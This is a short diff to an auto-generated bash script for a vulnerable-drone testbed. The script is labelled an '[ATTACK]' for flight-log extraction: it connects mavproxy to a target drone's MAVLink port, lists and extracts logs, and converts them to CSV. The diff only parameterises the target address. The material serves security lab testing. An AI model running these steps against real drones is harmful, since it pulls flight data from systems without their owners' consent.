@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Flight-Log-Extraction.md
-# Created: 2025-11-23 15:43:26
+# Created: 2025-11-23 16:46:38
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
@@ -15,7 +15,7 @@ fi
 
 log "[ATTACK] id=flight-log-extraction src=Flight-Log-Extraction.md"
 log "[BLOCK 1] type=shell"
-mavproxy.py --master=tcp:10.13.0.3:5760
+mavproxy.py --master=tcp:${TARGET_CC}:${PORT_SITL}
 
 log "[BLOCK 2] type=shell"
 log list
@@ -103,7 +103,7 @@ if __name__ == "__main__":
 PY
 
 log "[BLOCK 4] type=shell"
-python log-extract.py tcp:10.13.0.3:5760 1
+python log-extract.py tcp:${TARGET_CC}:${PORT_SITL} 1
 
 log "[BLOCK 5] type=shell"
 bin2csv -o logs_csv log_1.bin
